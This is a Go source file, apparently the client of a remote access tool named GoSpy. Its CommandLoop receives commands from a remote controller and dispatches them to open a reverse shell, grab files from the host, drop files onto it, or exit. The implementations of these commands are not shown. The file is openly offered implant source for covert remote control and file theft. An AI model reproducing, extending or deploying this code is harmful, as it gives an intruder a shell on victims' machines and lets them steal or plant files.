package client

import (
	"github.com/psidex/GoSpy/internal/commands"
	"github.com/psidex/GoSpy/internal/comms"
	"log"
	"os"
	"strings"
)

// CommandLoop is the loop that receives commands and executes them.
// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
func CommandLoop(cmdCon comms.Connection) (err error) {
	for {
		var message string
		message, err = cmdCon.RecvString()
		if err != nil {
			break
		}

		log.Printf("Recv: %s", message)
		args := strings.Split(message, " ")

		switch args[0] {
		case "exit":
			log.Println("Exiting")
			_ = cmdCon.Close()
			os.Exit(0)
		case "ping":
			err = commands.PingReply(cmdCon)
		case "reverse-shell":
			err = commands.ReverseShellReply(cmdCon)
		case "grab-file":
			path := strings.Join(args[1:], " ")
			err = commands.FileCmdReply(cmdCon, path, false)
		case "drop-file":
			path := strings.Join(args[1:], " ")
			err = commands.FileCmdReply(cmdCon, path, true)
		}

		if comms.IsNetworkError(err) {
			break
		}
		if err != nil {
			log.Printf("Command error: %s\b", err.Error())
		}
	}
	return err
}
